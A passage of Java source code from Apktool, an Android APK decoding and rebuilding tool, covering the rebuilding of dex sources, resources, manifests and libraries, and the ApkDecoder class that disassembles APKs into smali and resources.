                ResXmlPatcher.fixingPublicAttrsInProviderAttributes(manifest);
            } catch (IOException ex) {
                throw new AndrolibException(ex.getMessage());
            }
        }
    }

    public void buildSources(File appDir)
            throws AndrolibException {
        if (!buildSourcesRaw(appDir, "classes.dex") && !buildSourcesSmali(appDir, "smali", "classes.dex")) {
            LOGGER.warning("Could not find sources");
        }
    }

    public void buildNonDefaultSources(ExtFile appDir)
            throws AndrolibException {
        try {
            // loop through any smali_ directories for multi-dex apks
            Map<String, Directory> dirs = appDir.getDirectory().getDirs();
            for (Map.Entry<String, Directory> directory : dirs.entrySet()) {
                String name = directory.getKey();
                if (name.startsWith("smali_")) {
                    String filename = name.substring(name.indexOf("_") + 1) + ".dex";

                    if (!buildSourcesRaw(appDir, filename) && !buildSourcesSmali(appDir, name, filename)) {
                        LOGGER.warning("Could not find sources");
                    }
                }
            }

            // loop through any classes#.dex files for multi-dex apks
            File[] dexFiles = appDir.listFiles();
            if (dexFiles != null) {
                for (File dex : dexFiles) {

                    // skip classes.dex because we have handled it in buildSources()
                    if (dex.getName().endsWith(".dex") && ! dex.getName().equalsIgnoreCase("classes.dex")) {
                        buildSourcesRaw(appDir, dex.getName());
                    }
                }
            }
        } catch(DirectoryException ex) {
            throw new AndrolibException(ex);
        }
    }

    public boolean buildSourcesRaw(File appDir, String filename)
            throws AndrolibException {
        File working = new File(appDir, filename);
        if (!working.exists()) {
            return false;
        }
        File stored = new File(appDir, APK_DIRNAME + "/" + filename);
        if (buildOptions.forceBuildAll || isModified(working, stored)) {
            LOGGER.info("Copying " + appDir.toString() + " " + filename + " file...");
            try {
                BrutIO.copyAndClose(new FileInputStream(working), new FileOutputStream(stored));
                return true;
            } catch (IOException ex) {
                throw new AndrolibException(ex);
            }
        }
        return true;
    }

    public boolean buildSourcesSmali(File appDir, String folder, String filename)
            throws AndrolibException {
        ExtFile smaliDir = new ExtFile(appDir, folder);
        if (!smaliDir.exists()) {
            return false;
        }
        File dex = new File(appDir, APK_DIRNAME + "/" + filename);
        if (! buildOptions.forceBuildAll) {
            LOGGER.info("Checking whether sources has changed...");
        }
        if (buildOptions.forceBuildAll || isModified(smaliDir, dex)) {
            LOGGER.info("Smaling " + folder + " folder into " + filename + "...");
            dex.delete();
            SmaliBuilder.build(smaliDir, dex, buildOptions.forceApi > 0 ? buildOptions.forceApi : mMinSdkVersion);
        }
        return true;
    }

    public void buildResources(ExtFile appDir, UsesFramework usesFramework)
            throws BrutException {
        if (!buildResourcesRaw(appDir) && !buildResourcesFull(appDir, usesFramework)
                && !buildManifest(appDir, usesFramework)) {
            LOGGER.warning("Could not find resources");
        }
    }

    public boolean buildResourcesRaw(ExtFile appDir)
            throws AndrolibException {
        try {
            if (!new File(appDir, "resources.arsc").exists()) {
                return false;
            }
            File apkDir = new File(appDir, APK_DIRNAME);
            if (! buildOptions.forceBuildAll) {
                LOGGER.info("Checking whether resources has changed...");
            }
            if (buildOptions.forceBuildAll || isModified(newFiles(APK_RESOURCES_FILENAMES, appDir),
                    newFiles(APK_RESOURCES_FILENAMES, apkDir))) {
                LOGGER.info("Copying raw resources...");
                appDir.getDirectory().copyToDir(apkDir, APK_RESOURCES_FILENAMES);
            }
            return true;
        } catch (DirectoryException ex) {
            throw new AndrolibException(ex);
        }
    }

    public boolean buildResourcesFull(File appDir, UsesFramework usesFramework)
            throws AndrolibException {
        try {
            if (!new File(appDir, "res").exists()) {
                return false;
            }
            if (! buildOptions.forceBuildAll) {
                LOGGER.info("Checking whether resources has changed...");
            }
            File apkDir = new File(appDir, APK_DIRNAME);
            File resourceFile = new File(apkDir.getParent(), "resources.zip");

            if (buildOptions.forceBuildAll || isModified(newFiles(APP_RESOURCES_FILENAMES, appDir),
                    newFiles(APK_RESOURCES_FILENAMES, apkDir)) || (buildOptions.isAapt2() && !isFile(resourceFile))) {
                LOGGER.info("Building resources...");

                if (buildOptions.debugMode) {
                    if (buildOptions.isAapt2()) {
                        LOGGER.info("Using aapt2 - setting 'debuggable' attribute to 'true' in AndroidManifest.xml");
                        ResXmlPatcher.setApplicationDebugTagTrue(new File(appDir, "AndroidManifest.xml"));
                    } else {
                        ResXmlPatcher.removeApplicationDebugTag(new File(appDir, "AndroidManifest.xml"));
                    }
                }

                if (buildOptions.netSecConf) {
                    MetaInfo meta = readMetaFile(new ExtFile(appDir));
                    if (meta.sdkInfo != null && meta.sdkInfo.get("targetSdkVersion") != null) {
                        if (Integer.parseInt(meta.sdkInfo.get("targetSdkVersion")) < ResConfigFlags.SDK_NOUGAT) {
                            LOGGER.warning("Target SDK version is lower than 24! Network Security Configuration might be ignored!");
                        }
                    }
                    File netSecConfOrig = new File(appDir, "res/xml/network_security_config.xml");
                    if (netSecConfOrig.exists()) {
                        LOGGER.info("Replacing existing network_security_config.xml!");
                        netSecConfOrig.delete();
                    }
                    ResXmlPatcher.modNetworkSecurityConfig(netSecConfOrig);
                    ResXmlPatcher.setNetworkSecurityConfig(new File(appDir, "AndroidManifest.xml"));
                    LOGGER.info("Added permissive network security config in manifest");
                }

                File apkFile = File.createTempFile("APKTOOL", null);
                apkFile.delete();
                resourceFile.delete();

                File ninePatch = new File(appDir, "9patch");
                if (!ninePatch.exists()) {
                    ninePatch = null;
                }
                mAndRes.aaptPackage(apkFile, new File(appDir,
                                "AndroidManifest.xml"), new File(appDir, "res"),
                        ninePatch, null, parseUsesFramework(usesFramework));

                ExtFile tmpExtFile = new ExtFile(apkFile);
                Directory tmpDir = tmpExtFile.getDirectory();

                // Sometimes an application is built with a resources.arsc file with no resources,
                // Apktool assumes it will have a rebuilt arsc file, when it doesn't. So if we
                // encounter a copy error, move to a warning and continue on. (#1730)
                try {
                    tmpDir.copyToDir(apkDir,
                            tmpDir.containsDir("res") ? APK_RESOURCES_FILENAMES
                                    : APK_RESOURCES_WITHOUT_RES_FILENAMES);
                } catch (DirectoryException ex) {
                    LOGGER.warning(ex.getMessage());
                } finally {
                    tmpExtFile.close();
                }

                // delete tmpDir
                apkFile.delete();
            }
            return true;
        } catch (IOException | BrutException | ParserConfigurationException | TransformerException | SAXException ex) {
            throw new AndrolibException(ex);
        }
    }

    public boolean buildManifestRaw(ExtFile appDir)
            throws AndrolibException {
        try {
            File apkDir = new File(appDir, APK_DIRNAME);
            LOGGER.info("Copying raw AndroidManifest.xml...");
            appDir.getDirectory().copyToDir(apkDir, APK_MANIFEST_FILENAMES);
            return true;
        } catch (DirectoryException ex) {
            throw new AndrolibException(ex);
        }
    }

    public boolean buildManifest(ExtFile appDir, UsesFramework usesFramework)
            throws BrutException {
        try {
            if (!new File(appDir, "AndroidManifest.xml").exists()) {
                return false;
            }
            if (! buildOptions.forceBuildAll) {
                LOGGER.info("Checking whether resources has changed...");
            }

            File apkDir = new File(appDir, APK_DIRNAME);

            if (buildOptions.forceBuildAll || isModified(newFiles(APK_MANIFEST_FILENAMES, appDir),
                    newFiles(APK_MANIFEST_FILENAMES, apkDir))) {
                LOGGER.info("Building AndroidManifest.xml...");

                File apkFile = File.createTempFile("APKTOOL", null);
                apkFile.delete();

                File ninePatch = new File(appDir, "9patch");
                if (!ninePatch.exists()) {
                    ninePatch = null;
                }

                mAndRes.aaptPackage(apkFile, new File(appDir,
                                "AndroidManifest.xml"), null, ninePatch, null,
                        parseUsesFramework(usesFramework));

                Directory tmpDir = new ExtFile(apkFile).getDirectory();
                tmpDir.copyToDir(apkDir, APK_MANIFEST_FILENAMES);

                apkFile.delete();
            }
            return true;
        } catch (IOException | DirectoryException ex) {
            throw new AndrolibException(ex);
        } catch (AndrolibException ex) {
            LOGGER.warning("Parse AndroidManifest.xml failed, treat it as raw file.");
            return buildManifestRaw(appDir);
        }
    }

    public void buildLibs(File appDir) throws AndrolibException {
        buildLibrary(appDir, "lib");
        buildLibrary(appDir, "libs");
        buildLibrary(appDir, "kotlin");
        buildLibrary(appDir, "META-INF/services");
    }

    public void buildLibrary(File appDir, String folder) throws AndrolibException {
        File working = new File(appDir, folder);

        if (! working.exists()) {
            return;
        }

        File stored = new File(appDir, APK_DIRNAME + "/" + folder);
        if (buildOptions.forceBuildAll || isModified(working, stored)) {
            LOGGER.info("Copying libs... (/" + folder + ")");
            try {
                OS.rmdir(stored);
                OS.cpdir(working, stored);
            } catch (BrutException ex) {
                throw new AndrolibException(ex);
            }
        }
    }

    public void buildCopyOriginalFiles(File appDir)
            throws AndrolibException {
        if (buildOptions.copyOriginalFiles) {
            File originalDir = new File(appDir, "original");
            if (originalDir.exists()) {
                try {
                    LOGGER.info("Copy original files...");
                    Directory in = (new ExtFile(originalDir)).getDirectory();
                    if (in.containsFile("AndroidManifest.xml")) {
                        LOGGER.info("Copy AndroidManifest.xml...");
                        in.copyToDir(new File(appDir, APK_DIRNAME), "AndroidManifest.xml");
                    }
                    if (in.containsFile("stamp-cert-sha256")) {
                        LOGGER.info("Copy stamp-cert-sha256...");
                        in.copyToDir(new File(appDir, APK_DIRNAME), "stamp-cert-sha256");
                    }
                    if (in.containsDir("META-INF")) {
                        LOGGER.info("Copy META-INF...");
                        in.copyToDir(new File(appDir, APK_DIRNAME), "META-INF");
                    }
                } catch (DirectoryException ex) {
                    throw new AndrolibException(ex);
                }
            }
        }
    }

    public void buildUnknownFiles(File appDir, File outFile, MetaInfo meta)
            throws AndrolibException {
        if (meta.unknownFiles != null) {
            LOGGER.info("Copying unknown files/dir...");

            Map<String, String> files = meta.unknownFiles;
            File tempFile = new File(outFile.getParent(), outFile.getName() + ".apktool_temp");
            boolean renamed = outFile.renameTo(tempFile);
            if (!renamed) {
                throw new AndrolibException("Unable to rename temporary file");
            }

            try (
                    ZipFile inputFile = new ZipFile(tempFile);
                    ZipOutputStream actualOutput = new ZipOutputStream(new FileOutputStream(outFile))
            ) {
                copyExistingFiles(inputFile, actualOutput);
                copyUnknownFiles(appDir, actualOutput, files);
            } catch (IOException | BrutException ex) {
                throw new AndrolibException(ex);
            }

            // Remove our temporary file.
            tempFile.delete();
        }
    }

    private void copyExistingFiles(ZipFile inputFile, ZipOutputStream outputFile) throws IOException {
        // First, copy the contents from the existing outFile:
        Enumeration<? extends ZipEntry> entries = inputFile.entries();
        while (entries.hasMoreElements()) {
            ZipEntry entry = new ZipEntry(entries.nextElement());

            // We can't reuse the compressed size because it depends on compression sizes.
            entry.setCompressedSize(-1);
            outputFile.putNextEntry(entry);

            // No need to create directory entries in the final apk
            if (! entry.isDirectory()) {
                BrutIO.copy(inputFile, outputFile, entry);
            }

            outputFile.closeEntry();
        }
    }

    private void copyUnknownFiles(File appDir, ZipOutputStream outputFile, Map<String, String> files)
            throws BrutException, IOException {
        File unknownFileDir = new File(appDir, UNK_DIRNAME);

        // loop through unknown files
        for (Map.Entry<String,String> unknownFileInfo : files.entrySet()) {
            File inputFile;

            try {
                inputFile = new File(unknownFileDir, BrutIO.sanitizeUnknownFile(unknownFileDir, unknownFileInfo.getKey()));
            } catch (RootUnknownFileException | InvalidUnknownFileException | TraversalUnknownFileException exception) {
                LOGGER.warning(String.format("Skipping file %s (%s)", unknownFileInfo.getKey(), exception.getMessage()));
                continue;
            }

            if (inputFile.isDirectory()) {
                continue;
            }

            ZipEntry newEntry = new ZipEntry(unknownFileInfo.getKey());
            int method = Integer.parseInt(unknownFileInfo.getValue());
            LOGGER.fine(String.format("Copying unknown file %s with method %d", unknownFileInfo.getKey(), method));
            if (method == ZipEntry.STORED) {
                newEntry.setMethod(ZipEntry.STORED);
                newEntry.setSize(inputFile.length());
                newEntry.setCompressedSize(-1);
                BufferedInputStream unknownFile = new BufferedInputStream(new FileInputStream(inputFile));
                CRC32 crc = BrutIO.calculateCrc(unknownFile);
                newEntry.setCrc(crc.getValue());
                unknownFile.close();
            } else {
                newEntry.setMethod(ZipEntry.DEFLATED);
            }
            outputFile.putNextEntry(newEntry);

            BrutIO.copy(inputFile, outputFile);
            outputFile.closeEntry();
        }
    }

    public void buildApk(File appDir, File outApk) throws AndrolibException {
        LOGGER.info("Building apk file...");
        if (outApk.exists()) {
            outApk.delete();
        } else {
            File outDir = outApk.getParentFile();
            if (outDir != null && !outDir.exists()) {
                outDir.mkdirs();
            }
        }
        File assetDir = new File(appDir, "assets");
        if (!assetDir.exists()) {
            assetDir = null;
        }
        mAndRes.zipPackage(outApk, new File(appDir, APK_DIRNAME), assetDir);
    }

    public void publicizeResources(File arscFile) throws AndrolibException {
        mAndRes.publicizeResources(arscFile);
    }

    public void installFramework(File frameFile)
            throws AndrolibException {
        mAndRes.installFramework(frameFile);
    }

    public void listFrameworks() throws AndrolibException {
        mAndRes.listFrameworkDirectory();
    }

    public void emptyFrameworkDirectory() throws AndrolibException {
        mAndRes.emptyFrameworkDirectory();
    }

    public boolean isFrameworkApk(ResTable resTable) {
        for (ResPackage pkg : resTable.listMainPackages()) {
            if (pkg.getId() < 64) {
                return true;
            }
        }
        return false;
    }

    public static String getVersion() {
        return ApktoolProperties.get("application.version");
    }

    private File[] parseUsesFramework(UsesFramework usesFramework)
            throws AndrolibException {
        if (usesFramework == null) {
            return null;
        }

        List<Integer> ids = usesFramework.ids;
        if (ids == null || ids.isEmpty()) {
            return null;
        }

        String tag = usesFramework.tag;
        File[] files = new File[ids.size()];
        int i = 0;
        for (int id : ids) {
            files[i++] = mAndRes.getFrameworkApk(id, tag);
        }
        return files;
    }

    private boolean isModified(File working, File stored) {
        return ! stored.exists() || BrutIO.recursiveModifiedTime(working) > BrutIO .recursiveModifiedTime(stored);
    }

    private boolean isFile(File working) {
        return working.exists();
    }

    private boolean isModified(File[] working, File[] stored) {
        for (File file : stored) {
            if (!file.exists()) {
                return true;
            }
        }
        return BrutIO.recursiveModifiedTime(working) > BrutIO.recursiveModifiedTime(stored);
    }

    private File[] newFiles(String[] names, File dir) {
        File[] files = new File[names.length];
        for (int i = 0; i < names.length; i++) {
            files[i] = new File(dir, names[i]);
        }
        return files;
    }

    public void close() throws IOException {
        mAndRes.close();
    }

    private final static Logger LOGGER = Logger.getLogger(Androlib.class.getName());

    private final static String SMALI_DIRNAME = "smali";
    private final static String APK_DIRNAME = "build/apk";
    private final static String UNK_DIRNAME = "unknown";
    private final static String[] APK_RESOURCES_FILENAMES = new String[] {
            "resources.arsc", "AndroidManifest.xml", "res" };
    private final static String[] APK_RESOURCES_WITHOUT_RES_FILENAMES = new String[] {
            "resources.arsc", "AndroidManifest.xml" };
    private final static String[] APP_RESOURCES_FILENAMES = new String[] {
            "AndroidManifest.xml", "res" };
    private final static String[] APK_MANIFEST_FILENAMES = new String[] {
            "AndroidManifest.xml" };
    private final static String[] APK_STANDARD_ALL_FILENAMES = new String[] {
            "classes.dex", "AndroidManifest.xml", "resources.arsc", "res", "r", "R",
            "lib", "libs", "assets", "META-INF", "kotlin" };
    private final static Pattern NO_COMPRESS_PATTERN = Pattern.compile("(" +
            "jpg|jpeg|png|gif|wav|mp2|mp3|ogg|aac|mpg|mpeg|mid|midi|smf|jet|rtttl|imy|xmf|mp4|" +
            "m4a|m4v|3gp|3gpp|3g2|3gpp2|amr|awb|wma|wmv|webm|webp|mkv)$");
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/AndrolibException.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import brut.common.BrutException;

public class AndrolibException extends BrutException {
    public AndrolibException() {
    }

    public AndrolibException(String message) {
        super(message);
    }

    public AndrolibException(String message, Throwable cause) {
        super(message, cause);
    }

    public AndrolibException(Throwable cause) {
        super(cause);
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/ApkDecoder.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import brut.androlib.err.InFileNotFoundException;
import brut.androlib.err.OutDirExistsException;
import brut.androlib.err.UndefinedResObjectException;
import brut.androlib.meta.MetaInfo;
import brut.androlib.meta.PackageInfo;
import brut.androlib.meta.UsesFramework;
import brut.androlib.meta.VersionInfo;
import brut.androlib.res.AndrolibResources;
import brut.androlib.res.data.ResPackage;
import brut.androlib.res.data.ResTable;
import brut.directory.ExtFile;
import brut.androlib.res.xml.ResXmlPatcher;
import brut.common.BrutException;
import brut.directory.DirectoryException;
import brut.util.OS;
import com.google.common.base.Strings;

import java.io.File;
import java.io.IOException;
import java.util.*;
import java.util.logging.Logger;

public class ApkDecoder {
    public ApkDecoder() {
        this(new Androlib());
    }

    public ApkDecoder(Androlib androlib) {
        mAndrolib = androlib;
    }

    public ApkDecoder(File apkFile) {
        this(apkFile, new Androlib());
    }

    public ApkDecoder(File apkFile, Androlib androlib) {
        mAndrolib = androlib;
        setApkFile(apkFile);
    }

    public void setApkFile(File apkFile) {
        if (mApkFile != null) {
            try {
                mApkFile.close();
            } catch (IOException ignored) {}
        }

        mApkFile = new ExtFile(apkFile);
        mResTable = null;
    }

    public void setOutDir(File outDir) {
        mOutDir = outDir;
    }

    public void decode() throws AndrolibException, IOException, DirectoryException {
        try {
            File outDir = getOutDir();
            AndrolibResources.sKeepBroken = mKeepBrokenResources;

            if (!mForceDelete && outDir.exists()) {
                throw new OutDirExistsException();
            }

            if (!mApkFile.isFile() || !mApkFile.canRead()) {
                throw new InFileNotFoundException();
            }

            try {
                OS.rmdir(outDir);
            } catch (BrutException ex) {
                throw new AndrolibException(ex);
            }
            outDir.mkdirs();

            LOGGER.info("Using Apktool " + Androlib.getVersion() + " on " + mApkFile.getName());

            if (hasResources()) {
                switch (mDecodeResources) {
                    case DECODE_RESOURCES_NONE:
                        mAndrolib.decodeResourcesRaw(mApkFile, outDir);
                        if (mForceDecodeManifest == FORCE_DECODE_MANIFEST_FULL) {
                            // done after raw decoding of resources because copyToDir overwrites dest files
                            if (hasManifest()) {
                                mAndrolib.decodeManifestWithResources(mApkFile, outDir, getResTable());
                            }
                        }
                        break;
                    case DECODE_RESOURCES_FULL:
                        if (hasManifest()) {
                            mAndrolib.decodeManifestWithResources(mApkFile, outDir, getResTable());
                        }
                        mAndrolib.decodeResourcesFull(mApkFile, outDir, getResTable());
                        break;
                }
            } else {
                // if there's no resources.arsc, decode the manifest without looking
                // up attribute references
                if (hasManifest()) {
                    if (mDecodeResources == DECODE_RESOURCES_FULL
                            || mForceDecodeManifest == FORCE_DECODE_MANIFEST_FULL) {
                        mAndrolib.decodeManifestFull(mApkFile, outDir, getResTable());
                    }
                    else {
                        mAndrolib.decodeManifestRaw(mApkFile, outDir);
                    }
                }
            }

            if (hasSources()) {
                switch (mDecodeSources) {
                    case DECODE_SOURCES_NONE:
                        mAndrolib.decodeSourcesRaw(mApkFile, outDir, "classes.dex");
                        break;
                    case DECODE_SOURCES_SMALI:
                    case DECODE_SOURCES_SMALI_ONLY_MAIN_CLASSES:
                        mAndrolib.decodeSourcesSmali(mApkFile, outDir, "classes.dex", mBakDeb, mApiLevel);
                        break;
                }
            }

            if (hasMultipleSources()) {
                // foreach unknown dex file in root, lets disassemble it
                Set<String> files = mApkFile.getDirectory().getFiles(true);
                for (String file : files) {
                    if (file.endsWith(".dex")) {
                        if (! file.equalsIgnoreCase("classes.dex")) {
                            switch(mDecodeSources) {
                                case DECODE_SOURCES_NONE:
                                    mAndrolib.decodeSourcesRaw(mApkFile, outDir, file);
                                    break;
                                case DECODE_SOURCES_SMALI:
                                    mAndrolib.decodeSourcesSmali(mApkFile, outDir, file, mBakDeb, mApiLevel);
                                    break;
                                case DECODE_SOURCES_SMALI_ONLY_MAIN_CLASSES:
                                    if (file.startsWith("classes") && file.endsWith(".dex")) {
                                        mAndrolib.decodeSourcesSmali(mApkFile, outDir, file, mBakDeb, mApiLevel);
                                    } else {
                                        mAndrolib.decodeSourcesRaw(mApkFile, outDir, file);
                                    }
                                    break;
                            }
                        }
                    }
                }
            }

            mAndrolib.decodeRawFiles(mApkFile, outDir, mDecodeAssets);
            mAndrolib.decodeUnknownFiles(mApkFile, outDir);
            mUncompressedFiles = new ArrayList<>();
            mAndrolib.recordUncompressedFiles(mApkFile, mUncompressedFiles);
            mAndrolib.writeOriginalFiles(mApkFile, outDir);
            writeMetaFile();
        } finally {
            try {
                mApkFile.close();
            } catch (IOException ignored) {}
        }
    }

    public void setDecodeSources(short mode) throws AndrolibException {
        if (mode != DECODE_SOURCES_NONE && mode != DECODE_SOURCES_SMALI && mode != DECODE_SOURCES_SMALI_ONLY_MAIN_CLASSES) {
            throw new AndrolibException("Invalid decode sources mode: " + mode);
        }
        mDecodeSources = mode;
    }

    public void setDecodeResources(short mode) throws AndrolibException {
        if (mode != DECODE_RESOURCES_NONE && mode != DECODE_RESOURCES_FULL) {
            throw new AndrolibException("Invalid decode resources mode");
        }
        mDecodeResources = mode;
    }

    public void setForceDecodeManifest(short mode) throws AndrolibException {
        if (mode != FORCE_DECODE_MANIFEST_NONE && mode != FORCE_DECODE_MANIFEST_FULL) {
            throw new AndrolibException("Invalid force decode manifest mode");
        }
        mForceDecodeManifest = mode;
    }

    public void setDecodeAssets(short mode) throws AndrolibException {
        if (mode != DECODE_ASSETS_NONE && mode != DECODE_ASSETS_FULL) {
            throw new AndrolibException("Invalid decode asset mode");
        }
        mDecodeAssets = mode;
    }

    public void setAnalysisMode(boolean mode) {
        mAnalysisMode = mode;

        if (mResTable != null) {
            mResTable.setAnalysisMode(mode);
        }
    }

    public void setApiLevel(int apiLevel) {
        mApiLevel = apiLevel;
    }

    public void setBaksmaliDebugMode(boolean bakDeb) {
        mBakDeb = bakDeb;
    }

    public void setForceDelete(boolean forceDelete) {
        mForceDelete = forceDelete;
    }

    public void setFrameworkTag(String tag) {
        mAndrolib.buildOptions.frameworkTag = tag;
    }

    public void setKeepBrokenResources(boolean keepBrokenResources) {
        mKeepBrokenResources = keepBrokenResources;
    }

    public void setFrameworkDir(String dir) {
        mAndrolib.buildOptions.frameworkFolderLocation = dir;
    }

    public ResTable getResTable() throws AndrolibException {
        if (mResTable == null) {
            boolean hasResources = hasResources();
            boolean hasManifest = hasManifest();
            if (! (hasManifest || hasResources)) {
                throw new AndrolibException(
                        "Apk doesn't contain either AndroidManifest.xml file or resources.arsc file");
            }
            mResTable = mAndrolib.getResTable(mApkFile, hasResources);
            mResTable.setAnalysisMode(mAnalysisMode);
        }
        return mResTable;
    }

    public boolean hasSources() throws AndrolibException {
        try {
            return mApkFile.getDirectory().containsFile("classes.dex");
        } catch (DirectoryException ex) {
            throw new AndrolibException(ex);
        }
    }

    public boolean hasMultipleSources() throws AndrolibException {
        try {
            Set<String> files = mApkFile.getDirectory().getFiles(false);
            for (String file : files) {
                if (file.endsWith(".dex")) {
                    if (! file.equalsIgnoreCase("classes.dex")) {
                        return true;
                    }
                }
            }

            return false;
        } catch (DirectoryException ex) {
            throw new AndrolibException(ex);
        }
    }

    public boolean hasManifest() throws AndrolibException {
        try {
            return mApkFile.getDirectory().containsFile("AndroidManifest.xml");
        } catch (DirectoryException ex) {
            throw new AndrolibException(ex);
        }
    }

    public boolean hasResources() throws AndrolibException {
        try {
            return mApkFile.getDirectory().containsFile("resources.arsc");
        } catch (DirectoryException ex) {
            throw new AndrolibException(ex);
        }
    }

    public void close() throws IOException {
        if (mAndrolib != null) {
            mAndrolib.close();
        }
    }

    public final static short DECODE_SOURCES_NONE = 0x0000;
    public final static short DECODE_SOURCES_SMALI = 0x0001;
    public final static short DECODE_SOURCES_SMALI_ONLY_MAIN_CLASSES = 0x0010;

    public final static short DECODE_RESOURCES_NONE = 0x0100;
    public final static short DECODE_RESOURCES_FULL = 0x0101;

    public final static short FORCE_DECODE_MANIFEST_NONE = 0x0000;
    public final static short FORCE_DECODE_MANIFEST_FULL = 0x0001;

    public final static short DECODE_ASSETS_NONE = 0x0000;
    public final static short DECODE_ASSETS_FULL = 0x0001;

    private File getOutDir() throws AndrolibException {
        if (mOutDir == null) {
            throw new AndrolibException("Out dir not set");
        }
        return mOutDir;
    }

    private void writeMetaFile() throws AndrolibException {
        MetaInfo meta = new MetaInfo();
        meta.version = Androlib.getVersion();
        meta.apkFileName = mApkFile.getName();

        if (mResTable != null) {
            meta.isFrameworkApk = mAndrolib.isFrameworkApk(mResTable);
            putUsesFramework(meta);
            putSdkInfo(meta);
            putPackageInfo(meta);
            putVersionInfo(meta);
            putSharedLibraryInfo(meta);
            putSparseResourcesInfo(meta);
        } else {
            putMinSdkInfo(meta);
        }
        putUnknownInfo(meta);
        putFileCompressionInfo(meta);

        mAndrolib.writeMetaFile(mOutDir, meta);
    }

    private void putUsesFramework(MetaInfo meta) {
        Set<ResPackage> pkgs = mResTable.listFramePackages();
        if (pkgs.isEmpty()) {
            return;
        }

        Integer[] ids = new Integer[pkgs.size()];
        int i = 0;
        for (ResPackage pkg : pkgs) {
            ids[i++] = pkg.getId();
        }
        Arrays.sort(ids);

        meta.usesFramework = new UsesFramework();
        meta.usesFramework.ids = Arrays.asList(ids);

        if (mAndrolib.buildOptions.frameworkTag != null) {
            meta.usesFramework.tag = mAndrolib.buildOptions.frameworkTag;
        }
    }

    private void putSdkInfo(MetaInfo meta) {
        Map<String, String> info = mResTable.getSdkInfo();
        if (info.size() > 0) {
            String refValue;
            if (info.get("minSdkVersion") != null) {
                refValue = ResXmlPatcher.pullValueFromIntegers(mOutDir, info.get("minSdkVersion"));
                if (refValue != null) {
                    info.put("minSdkVersion", refValue);
                }
            }
            if (info.get("targetSdkVersion") != null) {
                refValue = ResXmlPatcher.pullValueFromIntegers(mOutDir, info.get("targetSdkVersion"));
                if (refValue != null) {
                    info.put("targetSdkVersion", refValue);
                }
            }
            if (info.get("maxSdkVersion") != null) {
                refValue = ResXmlPatcher.pullValueFromIntegers(mOutDir, info.get("maxSdkVersion"));
                if (refValue != null) {
                    info.put("maxSdkVersion", refValue);
                }
            }
            meta.sdkInfo = info;
        }
    }

    private void putMinSdkInfo(MetaInfo meta) {
        int minSdkVersion = mAndrolib.getMinSdkVersion();
        if (minSdkVersion > 0) {
            Map<String, String> sdkInfo = new LinkedHashMap<>();
            sdkInfo.put("minSdkVersion", Integer.toString(minSdkVersion));
            meta.sdkInfo = sdkInfo;
        }
    }

    private void putPackageInfo(MetaInfo meta) throws AndrolibException {
        String renamed = mResTable.getPackageRenamed();
        String original = mResTable.getPackageOriginal();

        int id = mResTable.getPackageId();
        try {
            id = mResTable.getPackage(renamed).getId();
        } catch (UndefinedResObjectException ignored) {}

        if (Strings.isNullOrEmpty(original)) {
            return;
        }

        meta.packageInfo = new PackageInfo();

        // only put rename-manifest-package into apktool.yml, if the change will be required
        if (!renamed.equalsIgnoreCase(original)) {
            meta.packageInfo.renameManifestPackage = renamed;
        }
        meta.packageInfo.forcedPackageId = String.valueOf(id);
    }

    private void putVersionInfo(MetaInfo meta) {
        VersionInfo info = mResTable.getVersionInfo();
        String refValue = ResXmlPatcher.pullValueFromStrings(mOutDir, info.versionName);
        if (refValue != null) {
            info.versionName = refValue;
        }
        meta.versionInfo = info;
    }

    private void putSharedLibraryInfo(MetaInfo meta) {
        meta.sharedLibrary = mResTable.getSharedLibrary();
    }

    private void putSparseResourcesInfo(MetaInfo meta) {
        meta.sparseResources = mResTable.getSparseResources();
    }

    private void putUnknownInfo(MetaInfo meta) {
        meta.unknownFiles = mAndrolib.mResUnknownFiles.getUnknownFiles();
    }

    private void putFileCompressionInfo(MetaInfo meta) {
        if (mUncompressedFiles != null && !mUncompressedFiles.isEmpty()) {
            meta.doNotCompress = mUncompressedFiles;
        }
    }

    private final Androlib mAndrolib;

    private final static Logger LOGGER = Logger.getLogger(Androlib.class.getName());

    private ExtFile mApkFile;
    private File mOutDir;
    private ResTable mResTable;
    private short mDecodeSources = DECODE_SOURCES_SMALI;
    private short mDecodeResources = DECODE_RESOURCES_FULL;
    private short mForceDecodeManifest = FORCE_DECODE_MANIFEST_NONE;
    private short mDecodeAssets = DECODE_ASSETS_FULL;
    private boolean mForceDelete = false;
    private boolean mKeepBrokenResources = false;
    private boolean mBakDeb = true;
    private Collection<String> mUncompressedFiles;
    private boolean mAnalysisMode = false;
    private int mApiLevel = 0;
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/ApktoolProperties.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

